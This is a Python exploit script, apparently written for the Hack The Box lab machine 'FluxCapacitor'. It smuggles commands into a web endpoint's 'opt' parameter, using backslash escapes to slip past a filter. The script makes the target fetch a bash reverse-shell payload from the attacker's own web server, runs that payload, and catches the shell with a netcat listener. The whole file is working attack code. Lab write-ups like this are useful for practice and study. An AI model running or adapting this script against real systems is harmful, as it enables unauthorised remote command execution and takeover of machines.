import os
import sys
import time
import socket
import threading
import http.server
import socketserver


class HTTPHandler(http.server.SimpleHTTPRequestHandler):

    def do_GET(self) -> None:
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()

        html = f"bash -i >& /dev/tcp/{local_host}/{local_port} 0>&1"

        self.wfile.write(html.encode("utf8"))


class FluxCapacitorBackConnect:
    def __init__(self, local_host, local_port):
        self.local_host = local_host
        self.local_port = local_port
        self.server_port = 8000

    def exploit(self):
        print("[+] Beginning exploit")
        # Start web server on a background thread
        web_thread = threading.Thread(target=self.start_web_server)
        web_thread.start()

        # Upload our bash reverse connect shell
        self.upload_shell()

        # Start background thread that sleeps for 3 second and performs the backconnect
        thread = threading.Thread(target=self.trigger_backconnect)
        thread.start()

        # Start our listener
        os.system("nc -nvlp " + self.local_port)

    def trigger_backconnect(self):
        print("[+] Popping shell in 3, 2, 1...")
        time.sleep(3)

        print("[+] POPPED!")
        self.send_command("ba\s\h /tmp/12345")

    def upload_shell(self):
        print("[+] Uploading shell")
        self.send_command(f"cur\l {self.local_host}:{self.server_port} -o /tmp/12345")
        print("[+] Shell uploaded")

    # Send a RAW socket request to prevent python-requests annoying URL encoding
    def send_command(self, command):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("10.10.10.69", 80))
        s.sendall(f"GET /sync?opt=' {command}' HTTP/1.1\r\nHost: 10.10.10.69\r\n\r\n".encode())

    def start_web_server(self):
        print("[+] Starting web server")
        handler = HTTPHandler

        server = socketserver.TCPServer((self.local_host, self.server_port), handler)
        server.serve_forever()


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: ./htb-fluxcapacitor.htb {LHOST} {LPORT}")
        sys.exit(1)

    # Global vars due to laziness
    local_host = sys.argv[1]
    local_port = sys.argv[2]

    flux = FluxCapacitorBackConnect(local_host, local_port)
    flux.exploit()
